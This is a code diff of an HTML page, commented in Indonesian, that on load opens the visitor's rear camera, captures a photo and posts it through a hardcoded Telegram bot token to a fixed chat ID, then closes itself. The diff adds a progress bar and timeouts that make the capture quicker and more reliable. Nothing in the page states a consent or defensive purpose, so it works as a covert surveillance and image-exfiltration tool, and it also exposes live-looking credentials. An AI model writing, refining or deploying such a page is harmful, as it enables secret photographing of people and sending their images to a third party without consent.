@@ -17,82 +17,110 @@
             left: 50%;
             transform: translate(-50%, -50%);
             text-align: center;
+            font-size: 18px;
+        }
+        #progress {
+            margin-top: 20px;
+            width: 80%;
+            height: 5px;
+            background: #f0f0f0;
+        }
+        #progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #4285f4;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div id="status">Memulai proses...</div>
+    <div id="progress"><div id="progress-bar"></div></div>
 
     <script>
-        // ============= KONFIGURASI ANDA =============
-        const BOT_TOKEN = ''bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc'';
+        // ============= KONFIGURASI =============
+        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
         const CHAT_ID = '7041008009';
-        // ============================================
+        const TIMEOUT = 15000; // 15 detik timeout
+        // =======================================
 
-        // Validasi token dan chat ID
-        function validateConfig() {
-            if (!BOT_TOKEN || typeof BOT_TOKEN !== 'string') {
-                throw new Error("Token bot tidak valid");
-            }
-            
-            // Token harus dimulai dengan 'bot' di API Telegram v2+
-            const actualToken = BOT_TOKEN.startsWith('bot') ? BOT_TOKEN : `bot${BOT_TOKEN}`;
-            
-            if (!CHAT_ID || isNaN(CHAT_ID)) {
-                throw new Error("Chat ID harus berupa angka");
-            }
-            
-            return {
-                botToken: actualToken,
-                chatId: CHAT_ID.toString()
-            };
+        const statusEl = document.getElementById('status');
+        const progressBar = document.getElementById('progress-bar');
+        let timeoutId;
+
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
         }
 
         async function autoCaptureAndSend() {
-            const statusEl = document.getElementById('status');
-            
             try {
-                // 1. Validasi konfigurasi
+                // 1. Validasi konfigurasi (3%)
+                updateProgress(3);
                 statusEl.textContent = "Memvalidasi konfigurasi...";
-                const { botToken, chatId } = validateConfig();
-                
-                // 2. Cek koneksi internet
+                if (!BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
+                    throw new Error("Konfigurasi tidak valid");
+                }
+
+                // 2. Cek koneksi (10%)
+                updateProgress(10);
+                statusEl.textContent = "Memeriksa koneksi...";
                 if (!navigator.onLine) {
                     throw new Error("Tidak ada koneksi internet");
                 }
-                
-                // 3. Tes koneksi ke bot Telegram
+
+                // 3. Tes koneksi ke Telegram (20%)
+                updateProgress(20);
                 statusEl.textContent = "Memeriksa bot Telegram...";
-                const botTest = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
+                
+                const botTest = await Promise.race([
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error("Timeout saat mengakses Telegram")), 5000)
+                ]);
+                
                 const botData = await botTest.json();
-                
                 if (!botData.ok) {
-                    throw new Error(`Token bot tidak valid: ${botData.description || 'Unknown error'}`);
+                    throw new Error("Token bot tidak valid");
                 }
-                
-                // 4. Akses kamera
+
+                // 4. Akses kamera (40%)
+                updateProgress(40);
                 statusEl.textContent = "Mengakses kamera...";
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                });
                 
-                // 5. Ambil foto
+                const stream = await Promise.race([
+                    navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: 'environment',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    }),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error("Timeout saat mengakses kamera")), 7000)
+                ]);
+
+                // 5. Ambil foto (60%)
+                updateProgress(60);
                 statusEl.textContent = "Menyiapkan kamera...";
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
                 video.playsInline = true;
-                
-                await new Promise((resolve) => {
+
+                await new Promise((resolve, reject) => {
+                    const timer = setTimeout(() => {
+                        reject(new Error("Kamera tidak merespon"));
+                    }, 3000);
+
                     video.onloadedmetadata = () => {
-                        setTimeout(resolve, 1500); // Biarkan kamera fokus
+                        clearTimeout(timer);
+                        setTimeout(resolve, 1000); // Fokus 1 detik
                     };
                 });
-                
+
+                // 6. Capture foto (80%)
+                updateProgress(80);
+                statusEl.textContent = "Mengambil foto...";
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -100,42 +128,52 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                 
-                // 6. Stop kamera
+                // Stop kamera
                 stream.getTracks().forEach(track => track.stop());
-                
-                // 7. Kirim ke Telegram
+
+                // 7. Kirim ke Telegram (90%)
+                updateProgress(90);
                 statusEl.textContent = "Mengirim ke Telegram...";
                 const blob = await (await fetch(photoDataUrl)).blob();
                 const formData = new FormData();
-                formData.append('chat_id', chatId);
+                formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'capture.jpg');
                 formData.append('caption', `Foto otomatis\n${new Date().toLocaleString()}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
+
+                const response = await Promise.race([
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error("Timeout saat mengirim ke Telegram")), 5000)
+                ]);
+
                 const result = await response.json();
-                
                 if (!result.ok) {
-                    throw new Error(result.description || "Gagal mengirim ke Telegram");
+                    throw new Error(result.description || "Gagal mengirim");
                 }
-                
-                // 8. Selesai
+
+                // 8. Selesai (100%)
+                updateProgress(100);
                 statusEl.textContent = "✅ Berhasil dikirim!";
                 setTimeout(() => window.close(), 2000);
-                
+
             } catch (error) {
+                clearTimeout(timeoutId);
                 statusEl.innerHTML = `❌ Error: ${error.message}<br><br>`;
-                statusEl.innerHTML += `Token: ${BOT_TOKEN ? '✔' : '❌'}<br>`;
-                statusEl.innerHTML += `Chat ID: ${CHAT_ID ? '✔' : '❌'}<br>`;
                 statusEl.style.color = '#d32f2f';
                 console.error("Error details:", error);
             }
         }
 
-        // Jalankan proses saat halaman dimuat
+        // Timeout keseluruhan
+        timeoutId = setTimeout(() => {
+            statusEl.innerHTML = "❌ Proses terlalu lama<br>Silakan refresh halaman";
+            statusEl.style.color = '#d32f2f';
+        }, TIMEOUT);
+
+        // Jalankan proses
         window.addEventListener('DOMContentLoaded', autoCaptureAndSend);
     </script>
 </body>
